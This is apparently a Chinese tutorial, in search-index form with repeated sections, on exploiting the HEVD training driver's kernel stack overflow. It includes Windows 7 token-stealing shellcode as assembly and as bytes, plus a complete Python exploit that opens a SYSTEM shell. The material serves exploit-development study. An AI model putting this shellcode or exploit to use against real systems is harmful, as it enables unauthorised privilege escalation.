\u4e00\u4e2a\u53ef\u4ee5\u6267\u884c\u7684\u7a7a\u95f4\uff0c\u91cc\u9762\u5305\u542b\u7740\u6211\u4eec\u7684 shellcode\u3002\u5728\u8fd9\u91cc\u4e3a\u63d0\u6743\u4ee3\u7801 \u4f7f\u6307\u4ee4\u6d41\u6307\u5411\u6211\u4eec\u7684 shellcode \u5982\u4f55\u89e6\u53d1\u6f0f\u6d1e \u4ece IDA \u4e2d\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5f97\u51fa\u4ece KernelBuffer \u5230 r \u9700\u8981 0x828 + 0x4 \u7684 byte\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u8f93\u5165\u7684buf \u662f 0x82c + shellcode address \u7684\u8bdd\uff0c\u90a3\u4e48\u6267\u884c\u5b8c TriggerBufferOverflowStack \u5c31\u4f1a\u8df3\u8f6c\u5230\u6211\u4eec\u7684 shellcode \u4e2d\u4e86\u3002 \u4e00\u4e2a\u53ef\u4ee5\u6267\u884c\u7684\u7a7a\u95f4\uff0c\u91cc\u9762\u5305\u542b\u7740\u6211\u4eec\u7684 shellcode \u4e00\u4e2a\u53ef\u4ee5\u6267\u884c\u7684\u7a7a\u95f4\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 VirtualAlloc \u51fd\u6570\u6765\u5206\u914d\uff0c\u7136\u540e\u628a\u6211\u4eec\u7684 shellcode byte \u6d41\u4ece\u8fdb\u7a0b\u7684\u6570\u636e\u7a7a\u95f4\u4e2d\u62f7\u8d1d\u5230\u65b0\u5206\u914d\u7684\u7a7a\u95f4\u4e2d\u5c31\u597d\u4e86\u3002 shellcode \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 HackSysExtremeVulnerableDriver\\Exploit\\Payloads.c \u4e2d\u7684\u4ee3\u7801\u3002\u8fd9\u91cc\u76f4\u63a5\u8d34\u51fa shellcode \u5e76\u7ed9\u51fa\u5176\u542b\u4e49\u3002 #include stdafx.h #include stdio.h #define KTHREAD_OFFSET 0x124 // nt!_KPCR.PcrbData.CurrentThread #define EPROCESS_OFFSET 0x050 // nt!_KTHREAD.ApcState.Process #define PID_OFFSET 0x0B4 // nt!_EPROCESS.UniqueProcessId #define FLINK_OFFSET 0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink #define TOKEN_OFFSET 0x0F8 // nt!_EPROCESS.Token #define SYSTEM_PID 0x004 // SYSTEM Process PID int main () { __asm { pushad ; Save registers state ; Start of Token Stealing Stub xor eax , eax ; Set ZERO mov eax , fs :[ eax + KTHREAD_OFFSET ]; Get nt ! _KPCR . PcrbData . CurrentThread ; _KTHREAD is located at FS : [ 0x124 ] mov eax , [ eax + EPROCESS_OFFSET ]; Get nt ! _KTHREAD . ApcState . Process mov ecx , eax ; Copy current process _EPROCESS structure mov edx , SYSTEM_PID ; WIN 7 SP1 SYSTEM process PID = 0x4 SearchSystemPID : mov eax , [ eax + FLINK_OFFSET ]; Get nt ! _EPROCESS . ActiveProcessLinks . Flink sub eax , FLINK_OFFSET cmp [ eax + PID_OFFSET ], edx ; Get nt ! _EPROCESS . UniqueProcessId jne SearchSystemPID mov edx , [ eax + TOKEN_OFFSET ]; Get SYSTEM process nt ! _EPROCESS . Token mov [ ecx + TOKEN_OFFSET ], edx ; Replace target process nt ! _EPROCESS . Token ; with SYSTEM process nt ! _EPROCESS . Token ; End of Token Stealing Stub popad ; Restore registers state ; Kernel Recovery Stub xor eax , eax ; Set NTSTATUS SUCCEESS add esp , 20 ; Fix the stack pop ebp ; Restore saved EBP ret 8 ; Return cleanly } } \u9996\u5148\u63d2\u4e2a\u9898\u5916\u8bdd\uff0c\u660e\u660e\u6211\u4eec\u7684 exp \u662f\u7528 python \u7f16\u5199\u7684\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u7684 shellcode \u662f c ? \u56e0\u4e3a\u6211\u4eec\u7684 shellcode \u6700\u7ec8\u662f\u8981\u8f6c\u5316\u4e3a\u5b57\u8282\u7684\u5f62\u5f0f\u7684\uff0c\u7136\u540e\u6211\u628a\u6c47\u7f16\u4ee3\u7801\u8f6c\u5316\u4e3a\u5b57\u8282\u7684\u5f62\u5f0f\u662f\u4f7f\u7528 VS \u7684 debug \u7a97\u53e3\u6765\u505a\u5230\u7684 \u50cf\u8fd9\u6837\u4e00\u4e2a byte \u4e00\u4e2a byte \u5730\u590d\u5236\u7c98\u8d34\u51fa\u6765\uff0c\u4e2a\u4eba\u611f\u89c9\u8fd9\u79cd\u505a\u6cd5\u5f88\u4f4e\u6548\uff0c\u4e0d\u77e5\u9053\u5e08\u5085\u4eec\u6709\u6ca1\u6709\u4ec0\u4e48\u597d\u7528\u7684\u65b9\u6cd5\u5462? shellcode \u7684\u4ee3\u7801\u4e0d\u957f\uff0c\u8fd9\u91cc\u5c31\u89e3\u91ca\u4e00\u4e0b\u6574\u6bb5\u4ee3\u7801\u3002 \u9996\u5148\u770b\u8fd9\u4e00\u6bb5\u3002\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\uff0c fs\u5bc4\u5b58\u5668\u6307\u5411 PCR(Processor Control Region)\uff0c\u5176\u6570\u636e\u7ed3\u6784\u4e3a KPCR\u3002\u6211\u4eec\u53ef\u4ee5\u5728 windbg \u4e2d\u770b\u5230\u5176\u5177\u4f53\u7ed3\u6784 \uff08\u4e0b\u6587\u7684\u6240\u6709\u6570\u636e\u7ed3\u6784\u540c\u7406\uff0c\u6211\u5c31\u4e0d\u4e00\u4e00\u8d34\u56fe\u4e86\uff0c\u6bd4\u5982KTHREAD\u7684\u67e5\u770b\u65b9\u6cd5\u4e3a dt _kthread \uff09 \u53ef\u4ee5\u770b\u5230\uff0c\u5728 fs:[0x124] \u7684\u4f4d\u7f6e\u5b58\u653e\u7684\u503c\u662f CurrentThread\uff0c\u5176\u6570\u636e\u7ed3\u6784\u4e3a KTHREAD \u7136\u540e KTHREAD.ApcState.Process \u6307\u5411\u7684\u662f KPREOCESS \u7ed3\u6784\uff0c\u6240\u4ee5\u6700\u540e eax \u7684\u503c\u6307\u5411\u5f53\u524d\u8fdb\u7a0b\u7684 EPROCESS \u7ed3\u6784\uff08\u8fd9\u91cc\u89e3\u91ca\u4e00\u4e0b\uff0cKTHREAD.ApcState.Process \u786e\u5b9e\u662f\u6307\u5411 KPROCESS \u6ca1\u9519\uff0c\u4f46\u662f\u56e0\u4e3a KPROCESS \u662f EPROCESS \u7ed3\u6784\u4f53\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\uff0c\u6240\u4ee5 KPROCESS \u548c EPROCESS \u7684\u8d77\u59cb\u5730\u5740\u5176\u5b9e\u662f\u4e00\u6837\u7684\uff09 ActiveProcessLinks \u662f\u4e00\u4e2a\u53cc\u94fe\u8868\u8282\u70b9\uff0c\u5728 Windwos \u4e2d\uff0c\u6240\u6709\u7684\u6d3b\u52a8\u8fdb\u7a0b\u90fd\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u6784\u6210\u4e00\u4e2a\u53cc\u94fe\u8868\u3002\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u88ab\u521b\u5efa\u65f6\uff0c\u5176 ActiveProcessLinks \u57df\u5c06\u88ab\u4f5c\u4e3a\u8282\u70b9\u52a0\u5165\u5230\u6b64\u94fe\u8868\u4e2d\u3002\u800c\u5176\u4e2d Flink \u662f\u6307\u5411\u8f83\u65e9\u52a0\u5165\u7684\u8fdb\u7a0b\u7684\u3002 \u6240\u4ee5\u8fd9\u6bb5\u4ee3\u7801\u7684\u5927\u81f4\u610f\u601d\u5c31\u662f\u4e0d\u65ad\u5730\u5f80\u524d\u627e\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u8fdb\u7a0b\u7684 PID \u4e3a 4\uff08SYSTEM \u8fdb\u7a0b\u7684 PID\uff09\uff0c\u53d6\u51fa\u5b83\u7684 Token \u503c\u5e76\u5c06\u8fd9\u4e2a Token \u503c\u590d\u5236\u7ed9\u6211\u4eec\u7684\u8fdb\u7a0b\u3002 \u6700\u540e\u8fd9\u6bb5\u4ee3\u7801\u662f\u7528\u6765\u8fd8\u539f\u6307\u4ee4\u6d41\u7684\u3002\uff08\u540c\u65f6\u4f7f\u88ab\u6211\u4eec\u63a7\u5236\u7684esp \u548c ebp \u56de\u5230\u6b63\u5e38\u7684\u503c\uff0c\u7f6e\u8fd4\u56de\u503c\u4e3a STATUS_UNSUCCESSFUL\uff09 \u770b\u5230\u8fd9\u6bb5\u6c47\u7f16\u6307\u4ee4\u3002\u672c\u6765 TriggerBufferOverflowStack \u51fd\u6570\u7684 ret \u662f\u8981\u56de\u5230 BufferOverflowStackIoctlHandler \u4e2d\u7684 mov [ebp+Status], eax \u7684\u3002\u4f46\u662f\u88ab\u6211\u4eec\u63a7\u5236\u4e86 eip \u5230\u4e86\u6211\u4eec\u7684 shellcode\u3002\u6240\u4ee5\u82e5\u6211\u4eec\u60f3\u8ba9\u6307\u4ee4\u56de\u5230\u6b63\u5e38\uff0c\u53ea\u9700\u8981\u5728shellcode\u7684\u6700\u540e\u505a\u8ddf\u539f\u6765\u4e00\u6837\u7684\u64cd\u4f5c\uff0c\u5c31\u80fd\u6b63\u5e38\u5730\u8fd4\u56de\u5230 IrpDeviceIoCtlHandler \u4e2d\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u5e94\u8be5 \u4f7f eax \u503c\u7b49\u4e8e STATUS_UNSUCCESSFUL\uff0c\u4e5f\u5c31\u662f 0 add esp, 20\u3002\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u6211\u4eec\u4e0d\u80fd mov esp, ebp\u5462\uff1f\u56e0\u4e3a\u8fd9\u91cc\u7684 ebp \u88ab\u6211\u4eec\u63a7\u5236\u6210 0x41414141 \u4e86\u3002\u5e76\u4e0d\u6307\u5411\u539f\u6765\u7684 old ebp\u3002\u90a3\u8fd9\u91cc\u5177\u4f53\u5e94\u8be5\u4f7f esp \u52a0\u591a\u5c11\u5c31\u8981\u770b\u539f\u6765\u6b63\u5e38\u7684\u6307\u4ee4\u5230\u4e86 call _TriggerBufferOverflowStack \u65f6 ebp \u548c esp \u76f8\u5dee\u591a\u5c11\u4e86\u3002\u5047\u8bbe\u8fd9\u65f6\u5019 ebp \u548c esp \u76f8\u5dee 0x16\uff0c\u90a3\u4e48\u6211\u4eec add esp, x \u4e2d\u7684 x \u5c31\u7b49\u4e8e 0x20\uff08\u56e0\u4e3a call \u6307\u4ee4\u4f1a\u6267\u884c\u4e00\u6761 push eip \u4f7f esp \u4ea7\u751f 4 \u7684\u79fb\u52a8\uff0c\u5e76\u4e14 shellcode \u5168\u7a0b\u5e76\u6ca1\u6709\u4f7f esp \u4ea7\u751f\u79fb\u52a8\uff09\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 windbg \u6765\u5f97\u5230\u8fd9\u4e2a\u6570\u503c \u6700\u540e\u5c31\u662f pop ebp;ret 8 \u4f7f\u6307\u4ee4\u6d41\u6307\u5411\u6211\u4eec\u7684 shellcode \u8fd9\u4e2a\u5f88\u7b80\u5355\uff0c\u53ea\u9700\u8981\u63a7\u5236 eip \u6307\u5411\u6211\u4eec\u7684 shellcode \u7684\u5730\u5740\u5c31\u597d\u4e86 0x03 HEVD \u6808\u6ea2\u51fa\u6f0f\u6d1e\u5229\u7528 \u6839\u636e\u4ee5\u4e0a\u7684\u5206\u6790\u6211\u89c9\u5f97\u8fd9\u91cc\u5e94\u8be5\u4e0d\u7528\u518d\u89e3\u91ca\u4e86\uff0c\u8fd9\u91cc\u76f4\u63a5\u7ed9\u51fa exp \u5e76\u770b\u4e00\u4e0b\u5b83\u7684\u8fd0\u884c\u7ed3\u679c #coding=utf-8 import ctypes , sys , struct from ctypes import * from subprocess import * kernel32 = windll . kernel32 # 0xC0000000 \u524d\u56db\u4f4d\u4e3a 1100,\u7b49\u540c\u4e8eGENERIC_READ | GENERIC_WRITE,\u5373\u8bfb\u5199\u6743\u9650 # 0x3 \u4e3a 0011,\u7b49\u540c\u4e8eFILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN,\u5373\u53ea\u8bfb\u548c\u9690\u85cf\u5c5e\u6027 hevDevice = kernel32 . CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , None , 0x3 , 0 , None ) if not hevDevice or hevDevice == - 1 : print *** Couldn t get Device Driver handle. sys . exit ( 0 ) shellcode = shellcode += bytearray ( \\x60 # pushad \\x33\\xC0 # xor eax,eax \\x64\\x8B\\x80\\x24\\x01\\x00\\x00 # mov eax,dword ptr fs:[eax+124h] \\x8B\\x40\\x50 # mov eax,dword ptr [eax+50h] \\x8B\\xC8 # mov ecx,eax \\xBA\\x04\\x00\\x00\\x00 # mov edx,4 \\x8B\\x80\\xB8\\x00\\x00\\x00 # mov eax,dword ptr [eax+0B8h] \\x2D\\xB8\\x00\\x00\\x00 # sub eax,0B8h \\x39\\x90\\xB4\\x00\\x00\\x00 # cmp dword ptr [eax+0B4h],edx \\x75\\xED # jne SearchSystemPID \\x8B\\x90\\xF8\\x00\\x00\\x00 # mov edx,dword ptr [eax+0F8h] \\x89\\x91\\xF8\\x00\\x00\\x00 # mov dword ptr [ecx+0F8h],edx \\x61 # popad \\x33\\xC0 # xor eax,eax \\x83\\xC4\\x14 # add esp,14h \\x5D # pop ebp \\xC2\\x08\\x00 # ret 8 ) # 0x3000 \u7b49\u540c\u4e8eMEM_COMMIT | MEM_RESERVE, \u5373\u9884\u7559\u5e76\u63d0\u4ea4\u8be5\u5757\u5185\u5b58 # 0x40 \u6307\u793a\u4e86\u5206\u914d\u7684\u9875\u9762\u7684\u4fdd\u62a4\u5c5e\u6027,\u5176\u503c\u7b49\u540c\u4e8ePAGE_EXECUTE_READWRITE,\u5373\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c ptr = kernel32 . VirtualAlloc ( c_int ( 0 ), c_int ( len ( shellcode )), c_int ( 0x3000 ), c_int ( 0x40 )) buff = ( c_char * len ( shellcode )) . from_buffer ( shellcode ) # \u628ashellcode \u590d\u5236\u5230\u5206\u914d\u7684\u5185\u5b58\u4e2d kernel32 . RtlMoveMemory ( c_int ( ptr ), buff , c_int ( len ( shellcode ))) shellcode_final = struct . pack ( L , ptr ) buf = A * 2092 + shellcode_final bufLength = len ( buf ) kernel32 . DeviceIoControl ( hevDevice , 0x222003 , buf , bufLength , None , 0 , byref ( c_ulong ()), None ) Popen ( start cmd , shell = True ) \u8fd0\u884c\u7ed3\u679c\u5982\u56fe\u6240\u793a 0x04 \u7ed3\u675f\u8bed \u4ece\u4e0b\u4e00\u7bc7\u5f00\u59cb\u5c06\u4f1a\u4fa7\u91cd\u4e8e\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u5206\u6790\u5229\u7528\u3002 2019.8.28","title":"\uff08\u4e00\uff09HEVD \u6808\u6ea2\u51fa"},{"location":"HEVD/stackoverflow/#0x00","text":"\u8fd9\u662fHEVD\u6f0f\u6d1e\u5229\u7528\u5b66\u4e60\u7684\u7b2c\u4e00\u7bc7\uff0c\u6240\u4ee5\u672c\u7bc7\u5c31\u5c3d\u53ef\u80fd\u5730\u9610\u8ff0\u5f97\u8be6\u7ec6\u4e00\u4e9b\uff0c\u5305\u62ec\u4ece\u54ea\u91cc\u5f00\u59cb\u5165\u624b\uff0c\u6574\u4e2a\u8fc7\u7a0b\u6211\u4eec\u5e94\u8be5\u8981\u505a\u4ec0\u4e48\u4ee5\u53ca\u6f0f\u6d1e\u7684\u5206\u6790\u5229\u7528\u3002\u540e\u7eed\u7684HEVD\u7bc7\u7ae0\u5c06\u4fa7\u91cd\u4e8e\u5bf9\u6f0f\u6d1e\u7684\u5206\u6790\u53ca\u5176\u5229\u7528\u3002 \u65e2\u7136\u662f\u7b2c\u4e00\u7bc7\uff0c\u6211\u4eec\u5c31\u4ece\u6700\u7b80\u5355\u7684\u6808\u6ea2\u51fa\u5165\u624b\u5427\u3002","title":"0x00 \u524d\u8a00"},{"location":"HEVD/stackoverflow/#0x01-windbg-preview-dbgprint","text":"\u9996\u5148\u672c\u8282\u548cHEVD\u6f0f\u6d1e\u5229\u7528\u5b66\u4e60\u6ca1\u6709\u5173\u7cfb\uff0c\u5373\u4f7f\u8fd9\u4e2a\u95ee\u9898\u4e0d\u89e3\u51b3\u4e5f\u53ef\u4ee5\u987a\u5229\u5730\u5b8c\u6210\u5229\u7528\u3002\u672c\u8282\u53ea\u662f\u5199\u7ed9\u548c\u6211\u4e00\u6837\u6709\u70b9\u513f\u5f3a\u8feb\u75c7\u7684\u201c\u60a3\u8005\u201d : ) \u5982\u56fe\u6240\u793a\uff0cDbgPrint \u51fd\u6570\u7684\u6267\u884c\u7ed3\u679c\u65e0\u6cd5\u88ab windbg \u63a5\u53d7\u5230\u3002 \u8fd9\u65f6\u5019\u4f60\u5982\u679c\u611f\u89c9\u5947\u602a\u5e76\u4e14\u60f3\u770b\u5230 DbgPrint \u51fd\u6570\u7684\u8f93\u51fa\u7ed3\u679c\u7684\u8bdd\u4f60\u5c31\u4f1a\u5f00\u59cb\u4e0a\u7f51\u641c\u7d22\u7c7b\u4f3c\u4e8e\u672c\u8282\u6807\u9898\u7684\u5185\u5bb9\u3002 \u7136\u540e\uff0c\u4f60\u53ef\u4ee5\u770b\u5230\u5f88\u591a\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u51e0\u4e4e\u6240\u6709\u7684\u7b54\u6848\u90fd\u662f\u544a\u8bc9\u4e86\u4f60\u8fd9\u4e24\u4e2a\u65b9\u6cd5 \u952e\u5165 ed Kd_DEFAULT_MASK 8 (\u6216\u662f 0xf \u6216\u662f 0xffffffff\uff0c\u8fd9\u4e2a\u4e0d\u91cd\u8981\uff0c\u53ea\u8981 8 \u90a3\u4e00\u4f4d\u4e3a 1 \u5c31\u53ef\u4ee5\u4e86) \u6dfb\u52a0\u6ce8\u518c\u8868\u952e HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Debug Print Filter \u7684\u4e00\u4e2a\u540d\u53eb DEFAULT \u768432\u4f4dDWORD\u503c\u4e3a 8 (\u540c\u7406\u6216\u662f0xf \u6216\u662f 0xffffffff) \u5f53\u7136\u8fd9\u65f6\u5019\u5982\u679c\u8d77\u4f5c\u7528\u7684\u8bdd\u81ea\u7136\u662f\u6700\u597d\uff0c\u5982\u679c\u4e0d\u8d77\u4f5c\u7528\u7684\u8bdd\u53ef\u4ee5\u8bd5\u8bd5\u4ee5\u4e0b\u89e3\u51b3\u529e\u6cd5\u3002 \u9996\u5148\u5728\u8981\u8c03\u8bd5\u7684\u673a\u5668\uff08\u8fd9\u91cc\u662f\u6211\u7684win7\u865a\u62df\u673a\uff09\u4e0a\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c DebugView\uff0c\u7136\u540e\u52fe\u9009\u4e0a Capture Kernel \u548c Enable Verbose Kernel Output \u4e4b\u540e\u4f7f\u7528 windbg \u8c03\u8bd5\u5c31\u53ef\u4ee5\u770b\u5230 DbgPrint \u8f93\u51fa\u7684\u6d88\u606f\u4e86 \u4e0d\u8fc7\u8fd9\u662f\u4e2a\u4ec0\u4e48\u539f\u7406\u6211\u4e5f\u641e\u4e0d\u61c2\u3002 \u8fd8\u6709\u4e2a\u95ee\u9898\u5c31\u662f\u4ece\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230\u6211\u6572\u5b8c\u547d\u4ee4\u540e\u4e00\u76f4\u51fa\u6765\u4e00\u53e5 DBGHELP: HEVD is not indexed \uff0c\u867d\u7136\u4e0d\u5f71\u54cd\u5206\u6790\u4f46\u662f\u6709\u6ca1\u6709\u5927\u54e5\u77e5\u9053\u8fd9\u662f\u4ec0\u4e48\u610f\u601d\u4ee5\u53ca\u600e\u4e48\u89e3\u51b3\uff1f","title":"0x01 windbg preview \u4e2d\u65e0\u6cd5\u663e\u793a dbgprint \u6d88\u606f\u7684\u95ee\u9898"},{"location":"HEVD/stackoverflow/#0x02-hevd","text":"\u9996\u5148\u770b\u5230\u6211\u4eec\u4e0b\u8f7d\u7684 HEVD \u9879\u76ee\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6709\u8fd9\u4e48\u4e24\u4e2a\u6587\u4ef6\u5939 HackSysExtremeVulnerableDriver/Driver/HEVD: HEVD.sys \u9a71\u52a8\u7a0b\u5e8f\u7684 build \u6e90\u7801 HackSysExtremeVulnerableDriver/Exploit: HEVD \u7684\u6f0f\u6d1e\u5229\u7528\u4ee3\u7801 \u6253\u5f00 /Driver/HEVD \u6587\u4ef6\u5939\u4e0b\u7684 BufferOverflowStack.c \u6587\u4ef6\uff0c\u8fd9\u5c31\u662f\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u6240\u5728\u3002\u9605\u8bfb\u4e00\u4e0b\u6e90\u7801\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u770b\u5230\u6f0f\u6d1e\u5728 TriggerBufferOverflowStack \u51fd\u6570\u4e2d \u5f88\u663e\u7136\u5730\u544a\u8bc9\u4e86\u6211\u4eec\u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u6ca1\u6709\u68c0\u67e5 UserBuffer \u7684\u5927\u5c0f\u76f4\u63a5\u5c06\u5b83\u590d\u5236\u7ed9\u4e86 KernelBuffer\u3002\u5927\u5bb6\u90fd\u77e5\u9053\u4e00\u65e6\u6709\u6808\u6ea2\u51fa\u6f0f\u6d1e\u4ea7\u751f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u6307\u4ee4\u6d41\u4e86\u3002HEVD \u9879\u76ee\u4e2d\u7528\u63d0\u6743\u6765\u9a8c\u8bc1\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u6211\u4eec\u80fd\u505a\u7684\u5f53\u7136\u4e0d\u4ec5\u5982\u6b64\uff0c\u4e0d\u8fc7\u8fd9\u91cc\u6211\u4eec\u4e5f\u7528\u63d0\u6743\u6765\u9a8c\u8bc1\u8fd9\u4e2a\u6f0f\u6d1e\u3002 \u63a5\u4e0b\u6765\u5206\u6790\u4e00\u4e0b\u9a71\u52a8\u7a0b\u5e8f\u7684\u6267\u884c\u6d41 \u53ef\u4ee5\u770b\u5230\u4ece\u5165\u53e3\u51fd\u6570\u8fdb\u6765\u4ee5\u540e\u5148\u5230\u4e86 IrpDeviceIoCtlHandler \u4e2d\u7136\u540e\u624d\u662f\u5230\u6211\u4eec\u7684\u6f0f\u6d1e\u51fd\u6570\uff0c\u8ddf\u8fdb IrpDeviceIoCtlHandler \u51fd\u6570\u4e2d\u770b\u4e00\u4e0b \u770b\u5230\u7ea2\u6846\u4e2d\u7684\u6c47\u7f16\u4ee3\u7801\u3002[ebp + IoControlCode] \u5c31\u662f\u6211\u4eec\u8f93\u5165\u7684 IO Control Code\u3002\u5927\u5bb6\u7a0d\u4f5c\u5206\u6790\u5c31\u80fd\u5f97\u51fa\u5f53\u6211\u4eec\u7684 IO Control Code \u7b49\u4e8e 0x222003 \u65f6\uff0c\u5728\u6700\u540e\u4e00\u53e5 jmp \u6307\u4ee4\u4e2d ecx \u5c31\u7b49\u4e8e 0\u3002\u5f53\u6700\u540e\u4e00\u53e5 jmp \u4e2d ecx \u7b49\u4e8e0 \u65f6\u5c31\u4f1a\u8df3\u8f6c\u5230 $LN5\u3002\u800c $LN5 \u4e2d\u7684\u6307\u4ee4\u5c06\u8df3\u8f6c\u5230\u51fd\u6570 BufferOverflowStackIoctlHandler \u4e2d\u3002\uff08\u5176\u4e2d\u7684\u6807\u8bc6\u7b26\u540d\u79f0\u53ef\u80fd\u4f1a\u4e0d\u4e00\u6837\uff0c\u4f46\u601d\u8def\u662f\u4e00\u6837\u7684\uff09 \u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u4ee3\u7801\u8fdb\u5165\u6f0f\u6d1e\u51fd\u6570 TriggerBufferOverflowStack \u4e86\uff08HEVD \u9879\u76ee\u4f7f\u7528 c \u6765\u7f16\u5199 exp\uff0c\u4e2a\u4eba\u8fd8\u662f\u89c9\u5f97\u7528 python \u6765\u7f16\u5199 exp \u66f4\u65b9\u4fbf\u4e00\u4e9b\uff09 import ctypes , sys from ctypes import * kernel32 = windll . kernel32 # 0xC0000000 \u524d\u56db\u4f4d\u4e3a 1100,\u7b49\u540c\u4e8eGENERIC_READ | GENERIC_WRITE,\u5373\u8bfb\u5199\u6743\u9650 # 0x3 \u4e3a 0011,\u7b49\u540c\u4e8eFILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN,\u5373\u53ea\u8bfb\u548c\u9690\u85cf\u5c5e\u6027 hevDevice = kernel32 . CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , None , 0x3 , 0 , None ) if not hevDevice or hevDevice == - 1 : print *** Couldn t get Device Driver handle. sys . exit ( 0 ) buf = A * 2048 bufLength = len ( buf ) kernel32 . DeviceIoControl ( hevDevice , 0x222003 , buf , bufLength , None , 0 , byref ( c_ulong ()), None ) \u76f8\u5173\u51fd\u6570\u82e5\u4e0d\u4e86\u89e3\u5c31\u81ea\u884c\u67e5\u9605\u76f8\u5173\u6587\u6863\u5427\u3002 \u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u8fdb\u5165\u6f0f\u6d1e\u51fd\u6570\u4e86\uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u662f\u5982\u4f55\u5229\u7528\u6f0f\u6d1e\u51fd\u6570\u7684\u95ee\u9898\u4e86\uff0c\u60f3\u60f3\u6211\u4eec\u63a5\u4e0b\u6765\u9700\u8981\u54ea\u4e9b\u4e1c\u897f\uff1f \u5982\u4f55\u89e6\u53d1\u6f0f\u6d1e \u4e00\u4e2a\u53ef\u4ee5\u6267\u884c\u7684\u7a7a\u95f4\uff0c\u91cc\u9762\u5305\u542b\u7740\u6211\u4eec\u7684 shellcode\u3002\u5728\u8fd9\u91cc\u4e3a\u63d0\u6743\u4ee3\u7801 \u4f7f\u6307\u4ee4\u6d41\u6307\u5411\u6211\u4eec\u7684 shellcode","title":"0x02 HEVD \u6808\u6ea2\u51fa\u6f0f\u6d1e\u5206\u6790"},{"location":"HEVD/stackoverflow/#_1","text":"\u4ece IDA \u4e2d\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5f97\u51fa\u4ece KernelBuffer \u5230 r \u9700\u8981 0x828 + 0x4 \u7684 byte\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u8f93\u5165\u7684buf \u662f 0x82c + shellcode address \u7684\u8bdd\uff0c\u90a3\u4e48\u6267\u884c\u5b8c TriggerBufferOverflowStack \u5c31\u4f1a\u8df3\u8f6c\u5230\u6211\u4eec\u7684 shellcode \u4e2d\u4e86\u3002","title":"\u5982\u4f55\u89e6\u53d1\u6f0f\u6d1e"},{"location":"HEVD/stackoverflow/#shellcode","text":"\u4e00\u4e2a\u53ef\u4ee5\u6267\u884c\u7684\u7a7a\u95f4\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 VirtualAlloc \u51fd\u6570\u6765\u5206\u914d\uff0c\u7136\u540e\u628a\u6211\u4eec\u7684 shellcode byte \u6d41\u4ece\u8fdb\u7a0b\u7684\u6570\u636e\u7a7a\u95f4\u4e2d\u62f7\u8d1d\u5230\u65b0\u5206\u914d\u7684\u7a7a\u95f4\u4e2d\u5c31\u597d\u4e86\u3002 shellcode \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 HackSysExtremeVulnerableDriver\\Exploit\\Payloads.c \u4e2d\u7684\u4ee3\u7801\u3002\u8fd9\u91cc\u76f4\u63a5\u8d34\u51fa shellcode \u5e76\u7ed9\u51fa\u5176\u542b\u4e49\u3002 #include stdafx.h #include stdio.h #define KTHREAD_OFFSET 0x124 // nt!_KPCR.PcrbData.CurrentThread #define EPROCESS_OFFSET 0x050 // nt!_KTHREAD.ApcState.Process #define PID_OFFSET 0x0B4 // nt!_EPROCESS.UniqueProcessId #define FLINK_OFFSET 0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink #define TOKEN_OFFSET 0x0F8 // nt!_EPROCESS.Token #define SYSTEM_PID 0x004 // SYSTEM Process PID int main () { __asm { pushad ; Save registers state ; Start of Token Stealing Stub xor eax , eax ; Set ZERO mov eax , fs :[ eax + KTHREAD_OFFSET ]; Get nt ! _KPCR . PcrbData . CurrentThread ; _KTHREAD is located at FS : [ 0x124 ] mov eax , [ eax + EPROCESS_OFFSET ]; Get nt ! _KTHREAD . ApcState . Process mov ecx , eax ; Copy current process _EPROCESS structure mov edx , SYSTEM_PID ; WIN 7 SP1 SYSTEM process PID = 0x4 SearchSystemPID : mov eax , [ eax + FLINK_OFFSET ]; Get nt ! _EPROCESS . ActiveProcessLinks . Flink sub eax , FLINK_OFFSET cmp [ eax + PID_OFFSET ], edx ; Get nt ! _EPROCESS . UniqueProcessId jne SearchSystemPID mov edx , [ eax + TOKEN_OFFSET ]; Get SYSTEM process nt ! _EPROCESS . Token mov [ ecx + TOKEN_OFFSET ], edx ; Replace target process nt ! _EPROCESS . Token ; with SYSTEM process nt ! _EPROCESS . Token ; End of Token Stealing Stub popad ; Restore registers state ; Kernel Recovery Stub xor eax , eax ; Set NTSTATUS SUCCEESS add esp , 20 ; Fix the stack pop ebp ; Restore saved EBP ret 8 ; Return cleanly } } 